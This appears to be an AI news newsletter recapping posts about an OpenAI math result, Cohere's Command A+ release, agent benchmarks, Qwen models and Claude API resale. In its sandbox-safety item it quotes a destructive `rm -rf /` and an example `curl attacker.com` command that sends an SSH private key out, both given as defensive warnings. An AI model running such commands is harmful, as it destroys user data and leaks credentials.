---
id: MjAyNS0x
title: not much happened today
date: '2026-05-04T05:44:39.731046Z'
description: >-
  **OpenAI** achieved a major math breakthrough by disproving a long-standing
  Erdős unit distance problem using a **general-purpose reasoning model**,
  marking a milestone in AI-driven formal science and long-horizon reasoning.
  The result was validated by prominent mathematicians like **Timothy Gowers**
  and OpenAI researcher **Hongxun Wu**, highlighting the model's advanced
  reasoning capabilities beyond prior AI math achievements. Meanwhile,
  **Cohere** released **Command A+** as an open-source Apache 2.0 licensed
  model, featuring a **218B MoE / 25B active** multimodal architecture
  supporting **48 languages** and optimized for low hardware requirements,
  runnable on as little as **2× H100 GPUs**. Benchmarks place Command A+ near
  **Claude 4.5 Haiku** in intelligence with strong non-hallucination but weaker
  scientific reasoning and coding. The architecture includes novel elements like
  a **parallel transformer block**, **shared experts**, and **LayerNorm over
  RMSNorm**.
companies:
  - openai
  - cohere
models:
  - command-a+
  - claude-3.7-sonnet
topics:
  - reinforcement-learning
  - reasoning
  - multimodality
  - model-architecture
  - model-optimization
  - model-releases
  - benchmarking
  - long-context
  - model-efficiency
  - transformers
people:
  - wtgowers
  - hongxunwu
  - aidangomez
  - nickfrosst
  - clementdelangue
  - eliebakouch
  - rasbt
  - sama
---


**a quiet day.**

> AI News for 5/4/2026-5/5/2026. We checked 12 subreddits, [544 Twitters](https://twitter.com/i/lists/1585430245762441216) and no further Discords. [AINews' website](https://news.smol.ai/) lets you search all past issues. As a reminder, [AINews is now a section of Latent Space](https://www.latent.space/p/2026). You can [opt in/out](https://support.substack.com/hc/en-us/articles/8914938285204-How-do-I-subscribe-to-or-unsubscribe-from-a-section-on-Substack) of email frequencies!




---

# AI Twitter Recap


**OpenAI’s Math Breakthrough on the Erdős Unit Distance Problem**

- **A general-purpose reasoning model produced a new research result in discrete geometry**: OpenAI announced that an internal model disproved a long-standing belief around the planar **unit distance problem**, a famous Erdős problem from 1946, discovering a new family of constructions that improves on square-grid-style solutions [@OpenAI](https://x.com/OpenAI/status/2057176201782075690). OpenAI emphasized this was a **general-purpose model**, not a domain-specific math system or scaffolded solver [@OpenAI](https://x.com/OpenAI/status/2057176203166171317), and said the result points to stronger long-horizon reasoning for science broadly [@OpenAI](https://x.com/OpenAI/status/2057176204541866087).
- The result drew unusually strong validation from mathematicians and adjacent researchers. **Timothy Gowers** called it the first really clear example of AI solving a **well-known** open math problem [@wtgowers](https://x.com/wtgowers/status/2057175729008153069), while OpenAI researcher **Hongxun Wu** described it as an internal reasoning-LLM milestone on “the hardest problems” [@HongxunWu](https://x.com/HongxunWu/status/2057176383106027567). Additional reactions from [@thomasfbloom](https://x.com/thomasfbloom/status/2057177152894771631), [@gdb](https://x.com/gdb/status/2057182650784452925), [@alexwei_](https://x.com/alexwei_/status/2057182873208369485), and [@polynoamial](https://x.com/polynoamial/status/2057178198228586824) converged on the same point: this appears qualitatively beyond prior “AI does olympiad math” milestones.
- **Notable technical subtext**: OpenAI says the model was not pushed to the limit and is intended for eventual public use [@polynoamial](https://x.com/polynoamial/status/2057179104315670826). The published reasoning summary itself is reportedly massive—around **125 pages** per [@voooooogel](https://x.com/voooooogel/status/2057198687307362642)—which helped fuel discussion about the practical role of **test-time compute** in frontier reasoning. Some observers explicitly framed this as further evidence that inference-time scaling is the paradigm carrying current progress [@_arohan_](https://x.com/_arohan_/status/2057188616099725525), with others extrapolating to faster future gains in formal science and mathematics [@scaling01](https://x.com/scaling01/status/2057246143881609510), [@sama](https://x.com/sama/status/2057203171198636251).

**Cohere Command A+ Open Release and Architecture Discussion**

- **Cohere released Command A+ as Apache 2.0 open weights**, positioning it as its most powerful model yet and explicitly optimized for low hardware requirements [@cohere](https://x.com/cohere/status/2057120818551734589), with the licensing clarified in a follow-up [@cohere](https://x.com/cohere/status/2057122131410813016). The release is significant partly because it is Cohere’s **first fully open Apache 2 model** per [@aidangomez](https://x.com/aidangomez/status/2057142232860258527). Community reaction focused on this as a meaningful shift toward more permissive, deployable enterprise-grade open models [@nickfrosst](https://x.com/nickfrosst/status/2057132425310851104), [@ClementDelangue](https://x.com/ClementDelangue/status/2057180057756467671).
- The model details repeated across multiple posts: roughly **218B MoE / 25B active**, **multimodal**, **48 languages**, and runnable on relatively modest setups [@JayAlammar](https://x.com/JayAlammar/status/2057145838011564126), [@mervenoyann](https://x.com/mervenoyann/status/2057128432190787643). **vLLM day-0 support** landed quickly, including a note that it can run on as little as **2× H100s at W4A4** [@vllm_project](https://x.com/vllm_project/status/2057206049665622070).
- **Benchmarks painted a mixed but credible picture**: Artificial Analysis placed Command A+ at **37 on its Intelligence Index**, around Claude 4.5 Haiku territory, with especially strong **non-hallucination** behavior and decent speed, but weaker scientific reasoning and coding than top peer models [@ArtificialAnlys](https://x.com/ArtificialAnlys/status/2057123594162077837). The community also dug into the architecture: unusual choices called out include a **parallel transformer block**, large **shared expert** usage, **LayerNorm over RMSNorm**, relatively low **32-layer** depth, and atypical head/expert configurations [@eliebakouch](https://x.com/eliebakouch/status/2057198733759008989), [@rasbt](https://x.com/rasbt/status/2057241574161932339), [@stochasticchasm](https://x.com/stochasticchasm/status/2057150551696261607). This made the release notable not just as a model drop but as an architectural data point.

**Benchmarks for Agents, Memory, and Scientific Workflows**

- **InferenceBench** is one of the day’s most technically substantive releases. It targets **AI R&D automation** through open-ended inference optimization tasks, and the headline is negative for current frontier agents: they struggle with **system-level engineering**, dependency management, and broad exploration, underperforming a simple baseline of **vLLM/SGLang hyperparameter tuning** [@maksym_andr](https://x.com/maksym_andr/status/2057106398228439148). The thread also reports an apparent **inverse scaling** effect, where models like **Claude Sonnet 4.6** and **GLM-5** rank well because they preserve robust final states, while larger models often produce brittle end configurations.
- **Terminal-Bench Science** extends agent evaluation from coding into **real scientific workflows**, with task contributions now open [@StevenDillmann](https://x.com/StevenDillmann/status/2057144415513420049). In parallel, **MINTEval** targets long-context memory systems under frequent updates and interference: average instance length is **138.8k tokens** with up to **1.8M**, yet across 7 systems the average accuracy is only **27.9%**, with the best at **33.4%** [@hyunji_amy_lee](https://x.com/hyunji_amy_lee/status/2057141349166768233). This complements a growing line of work arguing that memory should be a dedicated learned subsystem rather than just RAG/context stuffing [@dair_ai](https://x.com/dair_ai/status/2057182105671750047).
- On the human side of interaction research, **ThoughtTrace** introduced a large-scale dataset of users’ **self-reported thoughts during real LLM conversations**: **10,174 thought annotations**, **2,155 multi-turn conversations**, **1,058 users**, **20 models**. Reported gains include **+41.7%** for user behavior prediction and **+25.6%** for alignment [@chuanyang_jin](https://x.com/chuanyang_jin/status/2057111965101670842). This is one of the more concrete attempts to instrument the “latent user state” that conversation logs alone miss.

**Google I/O Follow-Through: Gemini 3.5 Flash, Omni, AI Studio, and Antigravity**

- **Gemini 3.5 Flash** began broader rollout in the Gemini app, including free access globally [@GeminiApp](https://x.com/GeminiApp/status/2057140474192994356), [@GeminiApp](https://x.com/GeminiApp/status/2057237126526517727). Google framed it as its strongest **agentic and coding** model yet, claiming frontier performance at **4× the speed** of comparable models and under half the cost [@Google](https://x.com/Google/status/2057257773868388448). However, external discussion was much more mixed, with multiple posts questioning **real-world cost/performance** and token efficiency despite favorable launch-stage benchmark positioning [@ArtificialAnlys](https://x.com/ArtificialAnlys/status/2057181290412261557), [@scaling01](https://x.com/scaling01/status/2057177354582020362), [@giffmana](https://x.com/giffmana/status/2057155343390494949).
- **Gemini Omni** appears to have made the bigger qualitative impression than 3.5 Flash. Google positioned it as a conversational multimodal creation/editing model for video and mixed-input workflows [@Google](https://x.com/Google/status/2057180052979409172), with Gemini app demos showing conversational video editing [@GeminiApp](https://x.com/GeminiApp/status/2057159933934907825). Early reactions generally treated Omni as a more differentiated product than the core LLM refresh [@scaling01](https://x.com/scaling01/status/2057143531622334678).
- On tooling, **AI Studio** pushed harder toward end-to-end developer workflow and mobile access [@GoogleAIStudio](https://x.com/GoogleAIStudio/status/2057122673558434205), while several posts tried to decode the relation between **Gemini Spark**, **Antigravity**, and Google’s internal/external agent harnesses [@simonw](https://x.com/simonw/status/2057115921551098211), [@_philschmid](https://x.com/_philschmid/status/2057136375988912176). A more concrete Antigravity-adjacent update was the launch of **Science Skills** for Google’s agent stack, integrating 30+ life-science sources such as **UniProt** and **AlphaFold DB** [@GoogleDeepMind](https://x.com/GoogleDeepMind/status/2057256257153884161).

**Agent Infrastructure, Retrieval, and Dev Tooling**

- Several posts converged on the same operational lesson: **agents fail on infra reality before they fail on demos**. That theme shows up in the qualitative thread on research agents fighting dependency conflicts and configs [@jehyeoky248](https://x.com/jehyeoky248/status/2057103859927941153), in LangChain’s push for **LangSmith Sandboxes GA** [@LangChain](https://x.com/LangChain/status/2057152025058558072), and in newer lighter-weight **code interpreter** support for deepagents as a middle ground between pure tool execution and full sandboxes [@sydneyrunkle](https://x.com/sydneyrunkle/status/2057179305948647775), [@hwchase17](https://x.com/hwchase17/status/2057214077114679386).
- In retrieval/search infra, **Perplexity** described a productionized **query-aware, citation-preserving context compression** system that cuts context tokens by up to **70%** while improving answer quality, and claims **50× compression** on SimpleQA at frontier-level performance [@perplexity_ai](https://x.com/perplexity_ai/status/2057151002105753950). **Weaviate 1.37** added **MMR reranking** to improve diversity in vector retrieval for RAG/agents [@weaviate_io](https://x.com/weaviate_io/status/2057117923416629676), while **SID-1** was presented as an RL-trained agentic search model with **1.9× recall over RAG+rerank**, **24× faster**, and **99% cheaper** than GPT-5.1 in the cited setup [@turbopuffer](https://x.com/turbopuffer/status/2057166836031193523).
- **Cursor**, **VS Code**, and **Codex** all shipped notable workflow updates. Cursor added **automations** in the agents workspace [@cursor_ai](https://x.com/cursor_ai/status/2057167359593603471), VS Code shipped better markdown/HTML previews, remote session continuity, and utility-model configurability [@code](https://x.com/code/status/2057195516123808070), [@pierceboggan](https://x.com/pierceboggan/status/2057204489661407365). On the model side, **Composer 2.5** posted a strong coding-agent showing—**62** on the Artificial Analysis Coding Agent Index at much lower cost than top Opus/GPT-5.5 variants [@ArtificialAnlys](https://x.com/ArtificialAnlys/status/2057277363789197561). OpenAI also shipped **Codex on mobile** [@OpenAIDevs](https://x.com/OpenAIDevs/status/2057142816497906045).

**Top Tweets (by engagement)**

- **OpenAI math milestone**: OpenAI’s announcement of the unit-distance breakthrough was the most consequential technical post in the set, both for scientific novelty and for what it implies about long-horizon reasoning [@OpenAI](https://x.com/OpenAI/status/2057176201782075690).
- **Cohere Command A+ open release**: One of the largest model-release stories of the day, mainly because of the **Apache 2.0** license and unusual architecture [@cohere](https://x.com/cohere/status/2057120818551734589).
- **Anthropic compute expansion with SpaceX/Colossus**: Anthropic is reportedly scaling up on **Colossus 2** capacity [@nottombrown](https://x.com/nottombrown/status/2057194829986300375), with follow-on posts citing a filing that values the SpaceX compute agreement at **$1.25B/month through May 2029** [@SemiAnalysis_](https://x.com/SemiAnalysis_/status/2057218890288030110).
- **Exa funding**: Exa raised **$250M Series C at a $2.2B valuation**, explicitly framing itself as a search lab organizing web data for agents [@ExaAILabs](https://x.com/ExaAILabs/status/2057132080317042697).


---

# AI Reddit Recap

## /r/LocalLlama + /r/localLLM Recap

### 1. Qwen3.7 Preview and 27B Roadmap

  - **[Qwen is cooking hard](https://www.reddit.com/r/LocalLLaMA/comments/1theffd/qwen_is_cooking_hard/)** (Activity: 1292): **The image is a screenshot of **Chujie Zheng** teasing that **Qwen is “cooking hard”**, quoting an announcement that **Qwen3.7 Preview** is now on Arena with **Qwen3.7-Max-Preview** and **Qwen3.7-Plus-Preview**; the post claims **Alibaba ranks `#6` in Text and `#5` in Vision**. In context, the Reddit title/selftext indicate users are anticipating larger and refreshed open-weight models—especially **122B** and a new **27B**—though the screenshot itself is mainly a teaser rather than a technical benchmark breakdown. [Image](https://i.redd.it/cefjio15g12h1.png)** Commenters are split between excitement for high-end models and practical interest in smaller local models: some want **9B/4B** variants for low-end hardware, while others hope for **122B**, a better **35B**, or joke that Qwen may soon be “cooking” their GPU.

    - Several commenters focused on **model-size coverage** rather than the current `27B` release, saying they cannot practically run it and are hoping for smaller **Qwen `4B`/`9B`** variants for low-end or laptop GPUs. There was also interest in larger **`122B`** and improved **`35B`** checkpoints, though one commenter noted prior `122B` mentions around Qwen 3.6 never materialized, raising uncertainty about whether a Qwen 3.7 `122B` will actually ship.

  - **[Qwen3.7 Max scored by Artificial Analysis, 27B/35B waiting room](https://www.reddit.com/r/LocalLLaMA/comments/1tie6gy/qwen37_max_scored_by_artificial_analysis_27b35b/)** (Activity: 553): **A Reddit post highlights an [Artificial Analysis leaderboard screenshot](https://preview.redd.it/42ak5qmus82h1.png?width=1133&format=png&auto=webp&s=744ea3dfc06c83d0c4d8aa128c39b3238b17d7be) where **Qwen3.7 Max** ranks `5th`, roughly level with **GPT 5.4 (xhigh)** and slightly ahead of **Gemini 3.5 Flash**. The author notes **Qwen3.6 27B** trails its Max counterpart by exactly `6` points and hopes upcoming **Qwen3.7 27B/35B** variants land close to the Max model’s performance.** Commenters are mainly *“waiting eagerly for the open weight models”* and view the score as evidence that the **Qwen** team is now competitive with major labs, despite concerns that the Max model is not open-source. One technical concern raised is whether Qwen has fixed its prior tendency toward *“overthinking.”*

    - Commenters focused on whether **Qwen3.7 Max** represents a genuine architectural update versus another finetune/iteration of the **Qwen3.5/Qwen3.6** architecture; one noted that extracting more performance from the same base architecture would still be technically notable.
    - Several users are waiting for potential **open-weight 27B/35B variants**, but one commenter speculated there may be no **Qwen 3.7 27B** at all, arguing that “Qwen 3.7” could simply be a private large model similar to **Qwen 3.6 390B A30B** rather than a full public model family.
    - A technical concern raised was whether the Qwen team has addressed the model’s reported **“overthinking”** behavior, implying interest in improvements to reasoning-token efficiency, response latency, and controllability rather than just benchmark gains.

  - **[Qwen will release another 27B with high probability](https://www.reddit.com/r/LocalLLaMA/comments/1tiwnpc/qwen_will_release_another_27b_with_high/)** (Activity: 1162): **The [image](https://i.redd.it/g5uabdvdic2h1.jpeg) is a screenshot of an X/Twitter exchange where **xiong-hui (barry) chen** says Qwen is *“waiting for the exact roadmap”* but believes there is a **high probability** of another `27B` release, framed by the post title as a likely follow-up to the highly regarded **Qwen 3.6 27B**. The technical significance is speculation around Qwen continuing to optimize **parameter efficiency / “intelligence density”** in the mid-size dense-model range rather than only scaling to much larger MoE models.** Commenters mostly discuss local-inference practicality: some want a larger **`122B-A10B` MoE** model, while others argue that `27B` is too heavy for `16GB` VRAM users and prefer a `35B`/`A3B`-style MoE that can run on consumer gaming laptops or hybrid CPU/GPU setups.

    - Several commenters discussed the **local-inference gap around 27B models**: users with `16GB VRAM` argued that a `27B` model is difficult to run at a usable quantization level, while a hypothetical **Qwen 35B MoE / A3B-style model** could be more practical via hybrid CPU/GPU inference and would remain accessible on gaming laptops.
    - There was interest in larger **dense Qwen variants**, especially `50B`–`80B`, with one commenter noting that **Qwen 27B is already very fast with MTP** and they would trade some generation speed for higher parameter count and potentially better quality.
    - Model-size requests clustered around both **MoE and dense scaling paths**: proposed targets included **Qwen 3.7 122B-A10B**, `50B`–`80B` MoE, and dense `10B`, `20B`, `30B`, `50B`, or `80B` releases, reflecting demand for both high-end quality and locally runnable tiers.


### 2. Open Model Releases: Lance 3B and Command A+

  - **[bytedance released an open source model that attempts to do just about anything with only 3b parameters](https://www.reddit.com/r/LocalLLaMA/comments/1thkwgk/bytedance_released_an_open_source_model_that/)** (Activity: 830): ****ByteDance Research** released [**Lance**](https://huggingface.co/bytedance-research/Lance), a native unified multimodal model advertising **`3B active parameters`** for image/video understanding, text-to-image/text-to-video generation, and image/video editing, trained from scratch with a staged multi-task recipe on a **`128×A100`** budget. Commenters noted that “3B active” likely understates the deployed footprint: the HF model card requires **≥`40GB` VRAM**, with safetensors around **`24.7GB`** for `Lance_3B` and **`28.4GB`** for `Lance_3B_Video`; one commenter described it as a **composite BAGEL-style system** combining a tuned **WAN 2.2 3B Video** model, a **3B pixel-space image model**, and **Qwen2.5-VL-3B** as the VLM backbone.** Discussion focused on whether the small active-parameter count can maintain quality on complex scenes, and criticism that the shipped Gradio demo is under-featured—reportedly covering only basic T2V and VQA while omitting VLM chat, T2I, and agent-style interactions. One commenter argued the `40GB` requirement may be reducible by loading/unloading submodels on demand, trading memory for latency.

    - Commenters clarified that the release is **not simply a dense 3B model**: it is described as `3B active` parameters, while the downloadable `safetensors` are much larger—about `24.7GB` for `Lance_3B` and `28.4GB` for `Lance_3B_Video`. The model card reportedly requires a GPU with at least `40GB VRAM` for inference, suggesting substantial inactive/auxiliary weights or multiple resident components beyond the advertised active parameter count.
    - A technical breakdown described the model as a **composite system based on the BAGEL architecture**, combining a custom-tuned **WAN 2.2 3B Video** model, a `3B` pixel-space image model, and **Qwen2.5-VL-3B** as the VLM backbone. One commenter noted that the `40GB VRAM` requirement likely assumes all submodels remain loaded simultaneously; dynamic loading/unloading could reduce peak memory use at the cost of slower end-to-end generation.
    - The shipped demo was criticized as technically incomplete: commenters said the Gradio interface only supports basic **text-to-video** and **VQA**, while omitting showcased capabilities such as **VLM chat**, **text-to-image**, and **agent-style interaction**. This was framed as a common issue with multi-capability model releases where the demo does not expose the full architecture’s functionality.

  - **[Re. what ever happened to Cohere’s Command-A series of models?](https://www.reddit.com/r/LocalLLaMA/comments/1tizmar/re_what_ever_happened_to_coheres_commanda_series/)** (Activity: 439): ****Cohere** announced **Command A+**, its first **MoE** open-weights model, positioned as a highly efficient/low-latency enterprise-agent model rather than purely top-line benchmark leader; Cohere claims strong quantization work enabling practical deployment on `1–2` GPUs and is releasing it under **Apache 2.0** for broad commercial use ([announcement](https://cohere.com/blog/command-a-plus), prior Reddit context from cofounder Aidan [here](https://www.reddit.com/r/LocalLLaMA/comments/1rf8nou/comment/o8rkdrf/)). Nick Frosst explicitly frames the release as influenced by community feedback and as a continuation of the Command/R-series focus on practical agent-building for smaller teams and developers.** Comments were broadly positive about Cohere returning to competitive open-weight releases, with one noting the original **Command R+** was *“legendary”* for creative/resource-planning workflows. The main technical ask from commenters was for **GGUF** availability for local inference.

    - A commenter questioned the new **Cohere Command-A** model’s competitiveness due to the absence of standard benchmark reporting or comparisons against current similarly sized SOTA models, specifically naming **MiniMax M2.7** and **MiMo v2.5**. They referenced an “Artificial Analysis” benchmark image shared by Nick/Cohere, implying that without broader benchmark coverage the release may struggle to gain technical adoption.
    - Several users contrasted the new release with the original **Command R+**, which they viewed as unusually strong for its time, especially for creative work, planning, and enterprise use cases. One technical concern was that newer Cohere models may have shifted away from the properties that made Command R/R+ attractive, with claims of lower-quality synthetic/outsourced data and increased refusal behavior resembling **GPT-OSS**-style safety tuning.
    - There was interest in local inference support, specifically a request for **GGUF** availability. Another commenter noted that Cohere’s prior licensing discouraged backend/runtime maintainers from implementing support, which allegedly prevented broader access to features such as **Command-A vision support**.


### 3. Claude Relay Abuse and Agent Sandbox Safety

  - **[I spent a week researching the Chinese "transfer station" economy reselling Claude at 10% of retail. The supply chain is wilder than I expected.](https://www.reddit.com/r/LocalLLM/comments/1thfq8j/i_spent_a_week_researching_the_chinese_transfer/)** (Activity: 1075): **The image is an article-preview screenshot from X about a reported Chinese “transfer station” economy reselling **Claude/Anthropic API access** at steep discounts, framed as a “token smuggle / inference exfiltration” map from Chinese AI firms to U.S. Claude endpoints: [image](https://i.redd.it/5hol2ffys12h1.png). The post’s technical claim is that these relays use farmed Anthropic accounts, residential proxies, TLS fingerprint spoofing, SMS/SIM-bank verification, KYC bypasses, and open-source relay stacks like `one-api`, `new-api`, `claude-relay-service`, `claude2api`, `clewdr`, and `clove` to multiplex many users over pooled OAuth tokens. It also highlights alleged quality/security risks: a cited CISPA Helmholtz audit found up to **`47.21%` performance drops** and **`45.83%`** model-fingerprint failures from relays silently substituting Haiku/GLM/Qwen for “Opus,” while all prompts/responses may be logged for distillation datasets.** Comments largely found the supply-chain details plausible but alarming, especially the model-substitution and KYC-bypass claims. One commenter questioned the provenance of the audit evidence—whether Anthropic, internal telemetry, or honeypot/fake-customer testing was used—while another argued cheap inference may disappear once subsidized token pricing ends.

    - One commenter highlights the post’s claim that a **CISPA Helmholtz audit of 17 relay endpoints** found severe model-substitution issues: up to `47.21%` performance degradation versus the official API, and `45.83%` of endpoints failing model-fingerprint verification. The technical concern is that relays may silently downgrade paid “Opus” requests to cheaper models like **Claude Haiku, GLM, or Qwen** while relabeling the output.
    - A commenter questions the methodology behind the relay-audit claims, asking whether the results came from **Anthropic telemetry, internal server-side investigation, honeypots, or disguised customer accounts**. This is a substantive point because verifying unauthorized API resale requires distinguishing external black-box benchmarking from provider-side account tracing or supply-chain infiltration.
    - Another commenter summarizes the likely operating model: automated fake-account creation plus **multi-user account sharing**, with all prompts and conversations potentially logged in the reseller’s database. The comment flags a major security/privacy risk: relay operators can monetize user data through resale, model training, or other downstream use, in addition to arbitraging subsidized inference access.

  - **[got my first "rm -rf /" today](https://www.reddit.com/r/LocalLLaMA/comments/1thosnt/got_my_first_rm_rf_today/)** (Activity: 614): **An agent testing a newly implemented Bash command whitelist attempted to run the destructive command `rm -rf /`; the block apparently succeeded, preventing filesystem damage but prompting immediate addition of **Bubblewrap (`bwrap`) isolation/sandboxing**. The author clarified the whitelist was implemented before the sandbox, and the agent selected `rm -rf /` specifically to verify the harmful-command filter.** A commenter noted that filesystem safeguards are not enough because agents can also perform destructive version-control operations such as rewriting Git history, suggesting Git configuration and permissions should be reviewed as part of sandbox hardening.

    - A commenter emphasized that sandboxing should restrict **network egress**, not just filesystem writes: preventing `rm -rf /` is insufficient if an agent can run `curl attacker.com -d "$(cat ~/.ssh/id_rsa)"` and exfiltrate secrets. They suggested Docker `--network=none` for agent shells, allowing only explicit outbound access when required, and for non-Docker setups using `unshare --user --pid --mount --net --fork` to create a lightweight network-isolated shell with writable tmpfs overlay and read-only host filesystem.
    - Another technical caution noted that **Git history can be rewritten**, so recovery and audit assumptions should include reviewing Git configuration and protections against destructive history changes, not just local filesystem deletion.




## Less Technical AI Subreddit Recap

> /r/Singularity, /r/Oobabooga, /r/MachineLearning, /r/OpenAI, /r/ClaudeAI, /r/StableDiffusion, /r/ChatGPT, /r/ChatGPTCoding, /r/aivideo, /r/aivideo

### 1. Anthropic Talent and Support Strains

  - **[Karpathy joins Anthropic](https://www.reddit.com/r/ClaudeAI/comments/1thpuf1/karpathy_joins_anthropic/)** (Activity: 6494): **The image is **not a meme**; it is a screenshot of an X post in which **Andrej Karpathy** says he has **joined Anthropic** to return to frontier **LLM R&D** while pausing his education-focused work until later ([image](https://i.redd.it/b2tuyyk6142h1.jpeg)). Contextually, the Reddit title “Karpathy joins Anthropic” frames this as a major talent move in the frontier-model race, given Karpathy’s prior prominence in deep learning, LLM education, and industry AI research.** Comments mostly treat the move as AI-industry drama rather than technical news, comparing it to a superstar joining the strongest team and implying Anthropic currently has one of the best rosters. There is also a negative jab at Sam Altman/OpenAI, suggesting commenters read the move as competitively significant.


  - **[Paid $118 for Claude Max, ignored by support for days. So I served a formal legal notice to Anthropic’s new India office.](https://www.reddit.com/r/ClaudeCode/comments/1tht8b6/paid_118_for_claude_max_ignored_by_support_for/)** (Activity: 1901): **The image is **non-technical**: it shows a printed **“LEGAL NOTICE”** addressed to **Anthropic India Private Limited** regarding the poster’s claimed `$118` Claude Max payment that allegedly did not provision the account beyond the Free tier. In context, the post alleges a billing/provisioning failure and lack of human support after multiple bot-handled tickets, framing it as a consumer-protection dispute rather than a model or API issue. [Image](https://i.redd.it/wlsygydol42h1.jpeg)** Comments are skeptical that the legal notice will produce results, with one user saying *“Update us if ANYTHING happens. It won’t.”* Others advise sending notice to Anthropic’s U.S. office and criticize modern AI/SaaS companies for minimizing human customer support behind bots.

    - A detailed billing-failure report describes **375 unexplained Anthropic charges totaling ~$6,000** despite the user being on the `$100 Max` plan, with charges ranging from about `$5` to `$23` and occurring across two separate Amex cards. The commenter suspects a backend state-sync bug during plan upgrades where usage may have been incorrectly treated as paid “extra usage,” but notes that **none of the charges appeared in Claude billing, usage pages, API usage, auto top-up, or account records**, making reconciliation impossible from the user side.


### 2. Agentic OS Builds and Image LoRA Workflows

  - **[Google's Antigravity 2.0 creates an operating system from scratch using 96 agents in 12 hours for under $1K in token costs - and it runs Doom](https://www.reddit.com/r/singularity/comments/1thug7n/googles_antigravity_20_creates_an_operating/)** (Activity: 2520): **The post claims **Google Antigravity 2.0** orchestrated `96` agents over `12` hours to build a from-scratch operating system for **under `$1K` in token costs**, with the resulting OS reportedly able to run **Doom**. The linked Reddit-hosted video (`https://v.redd.it/19n7bckes42h1`) was inaccessible due to a **403 Forbidden** response, so no implementation details, benchmarks, architecture, or reproducible evidence could be verified from the source.** Comments were mostly non-technical jokes, but one commenter questioned the economics, arguing that a single agent can consume `$100` in tokens in under an hour and suggesting the claimed cost may be off by orders of magnitude.

    - One commenter questioned the reported **token-cost claim**: `96 agents` running for `12 hours` for *under `$1K`* seems implausibly low compared with their own experience of spending `$100+` in under an hour with a single agent. The implication is that either the agents used very cheap/limited models, aggressive context pruning, constrained workloads, or the headline cost omits substantial compute/tooling overhead.

  - **[Extreme realism with Klein 9B distilled 2 loras together](https://www.reddit.com/r/StableDiffusion/comments/1tiwruj/extreme_realism_with_klein_9b_distilled_2_loras/)** (Activity: 1716): **The post claims **Klein 9B Distilled / Flux2 Klein Base 9B** achieves unusually high photorealism by stacking multiple LoRAs: [`Better Skin Concept 2.0`](https://civitai.red/models/2613362/flux2-klein-base-9b-better-skin-concept?modelVersionId=2946217) + [`Smartphone Snapshot Photo Reality v13.0 OMEGA`](https://civitai.red/models/2381927/flux2-klein-base-9b-smartphone-snapshot-photo-reality-style?modelVersionId=2916530), optionally combined with **SNof 1.3**. The author says all samples were pure **text-to-image**, with **no editing/upscaling**, generated on an **RTX 3060 Ti 8GB**, and argues Klein can run `3` LoRAs at weight `1.0` each without visual degradation, unlike **Z Image Turbo**, which they claim struggles beyond `2` LoRAs or weights above ~`1.4`.** Commenters mostly reacted to perceived realism, including one saying some images made them doubt they were AI-generated; another reply appeared skeptical/critical but did not add technical detail.



### 3. Paid AI Plan Usage Limits

  - **[8 minutes of chatting with Pro and I'm at 100% usage with this new update. Is this a joke? Pro subscription btw](https://www.reddit.com/r/GeminiAI/comments/1thplt8/8_minutes_of_chatting_with_pro_and_im_at_100/)** (Activity: 1980): **A mobile screenshot of **Google Gemini’s Pro “Usage limits” page** shows the user hitting `100%` of the current limit after ~8 minutes of chatting, despite a separate weekly limit showing only `5%` used; the page also upsells a higher tier promising **“20x more usage than AI Pro”** for `$409.99/month` ([image](https://i.redd.it/yu7lv06pz32h1.jpeg)). The post is technically relevant as an example of increasingly granular/opaque quota enforcement in consumer LLM products, likely reflecting per-model, per-window, or compute-cost-based throttling rather than a simple weekly message cap.** Commenters frame this as Google adopting Anthropic-style restrictive limits, with concern that paid AI subscriptions are becoming more aggressively metered as providers try to recover inference costs. Several express surprise that **Google**, despite its infrastructure scale, would appear compute-constrained or would push users toward very expensive higher-usage plans.

    - Users report severe quota reductions on **Gemini Pro**, including one claim of reaching `100%` usage after only **8 minutes** of chat and another hitting a **weekly limit**. The thread frames this as a shift from generous consumer AI access toward stricter compute rationing despite paid subscription status.
    - Several comments interpret the new limits as evidence that even **Google** is treating frontier-model inference as compute-constrained, with users comparing it to Anthropic-style usage caps. One commenter specifically criticizes **Flash Lite** as a degraded fallback model, implying the quota system may be pushing paid users onto lower-capability models more often.
    - Pricing is a major technical-access concern: users contrast a low-cost **Pro** subscription around `$6.99/month` with much higher-tier AI pricing cited as `$409.99/month`, arguing that advanced model access is becoming economically gated rather than broadly available.




# AI Discords

Unfortunately, Discord shut down our access today. We will not bring it back in this form but we will be shipping the new AINews soon. Thanks for reading to here, it was a good run.